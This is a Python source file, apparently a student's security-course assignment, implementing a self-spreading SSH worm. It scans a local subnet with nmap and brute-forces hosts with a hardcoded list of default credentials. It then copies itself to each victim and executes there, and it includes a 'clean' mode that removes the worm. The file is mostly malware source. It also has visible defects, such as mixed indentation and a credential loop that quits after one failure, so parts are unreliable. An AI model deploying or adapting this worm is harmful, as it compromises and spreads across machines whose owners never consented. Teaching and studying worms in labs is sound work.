import os
import sys
import socket
import paramiko
import nmap
import netinfo
import netifaces
import socket
import fcntl
import struct

# Michael nguyen
# Used Python 3.11
# Attempted the extra credit

# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################

def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	return os.path.isfile(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/

	infected_mark =  open(INFECTED_MARKER_FILE,'w')

	infected_mark.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	
	sftpClient = sshClient.open_sftp()

	sftpClient.put("/tmp/worm.py", "/tmp/" + "worm.py")

	sshClient.exec_command("chmod a+x /tmp/worm.py")

	sshClient.exec_command("python /tmp/worm.py ")

	sftpClient.close()

	sshClient.close()

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################

#worm infecting other machines
def spreadAndClean(sshClient):

    sftpClient = sshClient.open_sftp()

    sshClient.exec_command("rm /tmp/worm.py")

def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

	print("Connecting to..." + host + "Username: " + userName)

	try:
		sshClient.connect(host, username = userName, password = password)

		print("Connect to machine...")

		return 0

	except paramiko.SSHException:

		print("User or Pass invalid...")

		return 1

	except (socket.error, socket.gaierror) as e:

		print("Server side issues...")

		return 3


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 

		if tryCredentials(host, username, password, ssh) == 0:

			print("Worm is in...")

			return (ssh, username, password)	
		else:
	# Could not find working credentials
			return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.

	return netifaces.ifaddresses(interface)[2][0]['addr']

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	
	portScanner = nmap.PortScanner()

	portScanner.scan( '10.0.0.0/24', arguments = '-p 22 --open' )

	return portScanner.all_hosts()

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
def worm():

    if len(sys.argv) < 2:

        if isInfectedSystem():

            sys.exit("Worm has been here...")


    # Get the IP of the current system
    currentSystemInterface = ""

    for netFaces in netifaces.interfaces():

        if netFaces == 'lo':

            continue

        else:

            currentSystemInterface = netFaces

            break

    hostIP = getMyIP(currentSystemInterface)


    # Get the hosts on the same network
    networkHosts = getHostsOnTheSameNetwork()


    # Remove the IP of the current system from the list of discovered systems.
    networkHosts.remove(hostIP)

    print("Found hosts: ", networkHosts)
    
    if "-c" in sys.argv or "--clean" in sys.argv:
        # PRINT CLEANING AND RUN CLEANING FUNCTION
        print("Cleaning worm.py...")

        for host in networkHosts:

            sshInfo = attackSystem(host)

            if sshInfo:
                print("Trying to spread to clean...")
                try:
                    remotepath = '/tmp/infected.txt'

                    localpath = '/home/cpsc/'
                    
                    sftpClient = sshInfo[0].open_sftp()

                    sftpClient.get(remotepath, localpath)

                except IOError:

                    spreadAndClean(sshInfo[0])

                    print("Machine is cleaned...")

                else:

                    print("Cleaned...")

    else:

        # Go through the network hosts
        for host in networkHosts:
	
            # Try to attack this host
            sshInfo =  attackSystem(host)
	
            # Did the attack succeed?
            if sshInfo:

                print("Worm is spreading...")

	        try:
                    remotepath = '/tmp/infected.txt'

    	            localpath = '/home/cpsc/'

	            # Copy the file from the specified
	            # remote path to the specified
	            # local path. If the file does exist
	            # at the remote path, then get()
	            # will throw IOError exception
	            # (that is, we know the system is
	            # not yet infected).
                    sftpClient = sshInfo[0].open_sftp()

	            sftpClient.get(remotepath, localpath)

	        except IOError:

		        # If the system was already infected proceed.
		        # Otherwise, infect the system and terminate.
		        # Infect that system

	            spreadAndExecute(sshInfo[0])

	        else:

	            print("Spreading complete")

if __name__ == "__main__":
    worm()